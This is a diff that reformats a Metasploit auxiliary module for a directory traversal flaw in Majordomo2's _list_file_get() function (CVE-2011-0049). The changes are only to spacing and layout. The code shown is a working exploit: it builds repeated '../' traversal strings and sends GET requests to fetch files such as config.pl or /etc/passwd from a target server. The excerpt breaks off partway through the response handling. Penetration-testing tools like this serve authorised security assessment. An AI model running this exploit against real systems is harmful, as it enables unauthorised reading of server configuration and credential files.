@@ -10,31 +10,31 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'           => 'Majordomo2 _list_file_get() Directory Traversal',
-      'Description'    => %q{
+      'Name' => 'Majordomo2 _list_file_get() Directory Traversal',
+      'Description' => %q{
           This module exploits a directory traversal vulnerability present in
         the _list_file_get() function of Majordomo2 (help function). By default, this
         module will attempt to download the Majordomo config.pl file.
       },
-      'Author'         =>	['Nikolas Sotiriu'],
-      'References'     =>
-        [
-          ['OSVDB', '70762'],
-          ['CVE', '2011-0049'],
-          ['CVE', '2011-0063'],
-          ['URL', 'https://www.sotiriu.de/adv/NSOADV-2011-003.txt'],
-          ['EDB', '16103']
-        ],
+      'Author' =>	['Nikolas Sotiriu'],
+      'References' => [
+        ['OSVDB', '70762'],
+        ['CVE', '2011-0049'],
+        ['CVE', '2011-0063'],
+        ['URL', 'https://www.sotiriu.de/adv/NSOADV-2011-003.txt'],
+        ['EDB', '16103']
+      ],
       'DisclosureDate' => 'Mar 08 2011',
-      'License'        =>  MSF_LICENSE
+      'License' => MSF_LICENSE
     )
 
     register_options(
       [
-        OptString.new('FILE', [ true,  "Define the remote file to view, ex:/etc/passwd", 'config.pl']),
+        OptString.new('FILE', [ true, "Define the remote file to view, ex:/etc/passwd", 'config.pl']),
         OptString.new('URI', [true, 'Majordomo vulnerable URI path', '/cgi-bin/mj_wwwusr/domain=domain?user=&passw=&func=help&extra=']),
         OptInt.new('DEPTH', [true, 'Define the max traversal depth', 8]),
-      ])
+      ]
+    )
   end
 
   def run_host(ip)
@@ -42,30 +42,31 @@ class MetasploitModule < Msf::Auxiliary
       '../',
       './.../'
     ]
-    uri  = normalize_uri(datastore['URI'])
+    uri = normalize_uri(datastore['URI'])
     file = datastore['FILE']
     deep = datastore['DEPTH']
     file = file.gsub(/^\//, "")
 
     trav_strings.each do |trav|
       str = ""
-      i   = 1
+      i = 1
       while (i <= deep)
         str = trav * i
         payload = "#{str}#{file}"
 
         res = send_request_raw(
           {
-            'method'  => 'GET',
-            'uri'     => uri + payload,
-          }, 25)
+            'method' => 'GET',
+            'uri' => uri + payload,
+          }, 25
+        )
 
         if res.nil?
           print_error("#{rhost}:#{rport} Connection timed out")
           return
         end
 
-        print_status("#{rhost}:#{rport} Trying URL " + payload )
+        print_status("#{rhost}:#{rport} Trying URL " + payload)
 
         if (res and res.code == 200 and res.body)
           if res.body.match(/\<html\>(.*)\<\/html\>/im)
